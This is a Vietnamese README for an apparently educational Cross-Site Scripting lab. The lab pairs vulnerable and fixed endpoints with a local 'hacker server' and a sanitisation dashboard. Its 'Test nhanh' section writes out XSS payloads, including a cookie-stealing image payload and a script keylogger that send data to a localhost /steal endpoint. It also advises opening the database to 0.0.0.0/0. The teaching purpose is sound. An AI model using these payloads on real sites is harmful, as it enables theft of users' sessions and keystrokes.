# XSS Security Lab

Bài tập thực hành **Cross-Site Scripting** — demo 3 loại tấn công và cách phòng chống.

| Service | Port | Mô tả |
|---|---|---|
| Backend (Express + Prisma + MongoDB) | 3000 | REST API |
| Frontend (React + Vite + Tailwind) | 5173 | Web app |
| Hacker Server (Express + WebSocket) | 4000 | Nhận dữ liệu bị đánh cắp |

---

## Cài đặt & Chạy

**Yêu cầu:** Node.js >= 18, tài khoản MongoDB Atlas

```bash
git clone <repo-url> && cd cross-siteScripting

cp backend/.env.example backend/.env
# Mở backend/.env → điền DATABASE_URL từ MongoDB Atlas

npm run setup   # cài deps + prisma generate (chạy 1 lần)
npm run dev     # khởi động cả 3 server
```

> Lần đầu chạy backend cần thêm: `cd backend && npx prisma db push`

**Chạy riêng từng service:**
```bash
cd backend       && npm run dev   # :3000
cd frontend      && npm run dev   # :5173
cd hacker-server && npm run dev   # :4000
```

---

## Phân công

Chi tiết demo từng người xem **[TASKS.md](./TASKS.md)**

| Người | Demo | URL |
|---|---|---|
| Person 1 | DOM XSS | `localhost:5173/xss-demo` |
| Person 2 | Reflected XSS | `localhost:3000/demo/reflected-xss?msg=` |
| Person 3 | Stored XSS + Security Dashboard | `localhost:5173/posts`, `/security` |
| Person 4 | Hacker Server real-time | `localhost:4000` |

---

## Test nhanh

### DOM XSS — `/xss-demo`
Nhập vào ô input: `<img src=x onerror="alert('XSS')">`

### Reflected XSS
```
http://localhost:3000/demo/reflected-xss?msg=<script>alert('XSS')</script>
http://localhost:3000/demo/reflected-xss-fixed?msg=<script>alert('XSS')</script>
```

### Stored XSS — `/posts/new`
Đăng nhập → tạo bài → chọn **Vulnerable Mode** → dùng Payload Library → đăng bài → mở bài → XSS thực thi.  
Toggle sang **Secure Mode** → DOMPurify chặn.

Payload hay dùng:
```html
<img src=x onerror="alert('Stored XSS')">
<img src=x onerror="fetch('http://localhost:4000/steal?cookie='+document.cookie)">
<script>document.onkeypress=function(e){fetch('http://localhost:4000/steal?type=key&key='+e.key)}</script>
```

### Hacker Server — `localhost:4000`
Tạo post keylogger → mở bài → gõ phím → xem real-time trên Dashboard.

### Security Dashboard — `/security`
Chọn payload → so sánh 5 phương pháp sanitize. Toggle CSP ON → browser chặn inline script.

---

## Troubleshooting

| Lỗi | Giải pháp |
|---|---|
| Backend không start | `npx prisma generate && npx prisma db push` |
| `document.cookie` trống | Đúng — cookie là `httpOnly`. Dùng keylogger thay thế |
| Hacker Dashboard trống | Kiểm tra port 4000 đang chạy |
| MongoDB connection fail | Atlas → Network Access → Allow from anywhere (`0.0.0.0/0`) |
| CORS error | Backend cho phép `localhost:5173` — kiểm tra URL |

---

## Lưu ý

- Cookie `httpOnly: true` → `document.cookie` luôn trống. Dùng **Keylogger** hoặc **Phishing Overlay** để demo.
- File `.env` không được commit — xem `backend/.env.example`.
